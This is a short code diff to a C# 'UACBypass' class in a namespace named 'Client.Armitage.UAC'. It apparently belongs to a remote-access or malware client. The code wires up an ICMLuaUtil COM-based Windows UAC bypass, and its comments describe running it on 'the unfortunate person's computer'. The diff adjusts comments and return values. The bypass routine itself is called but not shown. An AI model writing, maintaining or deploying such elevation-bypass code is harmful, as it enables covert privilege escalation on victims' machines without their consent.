@@ -8,17 +8,14 @@ namespace Client.Armitage.UAC
 {
     /// <summary>
     /// Gets creative mode on the unfortunate person's computer.
-    /// The methods here matches the criteria: 
-    /// 1.) Works on Windows 7 to the latest OS 
-    /// 2.) Works on x86
     /// </summary>
     public enum UACMethods
     {
         /// <summary>
-        /// The best method.
-        /// And the only one you'll ever need.
+        /// Only works on 64-bit...
         /// </summary>
         ICMLuaUtil = 0,
+
     }
     public static class UACBypass
     {
@@ -29,10 +26,9 @@ namespace Client.Armitage.UAC
                 switch (method)
                 {
                     case UACMethods.ICMLuaUtil:
-                        ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
+                        return ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
                         break;
                 }
-                return true;
             }
             catch
             {
